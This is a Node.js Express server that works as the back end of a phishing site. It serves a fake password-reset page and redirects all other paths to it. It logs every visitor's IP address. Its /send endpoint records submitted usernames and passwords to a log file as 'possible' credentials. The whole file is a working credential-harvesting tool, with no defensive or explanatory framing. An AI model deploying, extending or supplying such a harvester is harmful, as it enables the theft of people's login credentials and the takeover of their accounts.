const fs = require("fs")
const express = require('express')
const app = express()
const filePath = "path/to/your/log/file"

function writeToLogFile(contents) {
  fs.appendFile(filePath, '\n' + contents, (err) => {
    if (err) throw err
    console.log(contents)
  });
}

function getIpAddress (req) {
	return req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress || req.connection.socket.remoteAddress;
}

app.get('/account/reset_password', function (req, res) {
  var contents = "A client whose ip is " + "'" + getIpAddress(req) + "'" + " requested the page " + "'" + "/account/reset_password" + "'"
  writeToLogFile(contents)
  res.sendFile(
    "/public/resetpassword.html",
    {
      'root': "path/to/your/root/directory/of/your/nodejs/project",
    })
})

app.get('/send', function (req, res) {
	var contents
	if (req.query.u || req.query.p) {
    if (req.query.u) {
      contents = "Possible username is " + "'" + req.query.u + "'"
    }
    if (req.query.p) {
			contents += '\n' + "Possible password is " + "'" + req.query.p + "'"
    }
    writeToLogFile(contents)
	}
  res.send({ stats: "success" })
})

app.get('*', function (req, res) {
  var contents = "A client whose ip is " + "'" + getIpAddress(req) + "'" + " requested the page " + "'" + req.url + "'"
  writeToLogFile(contents)
  res.redirect('/account/reset_password')
})

app.listen('65534', function() {
  console.log("app is running at 65534")
})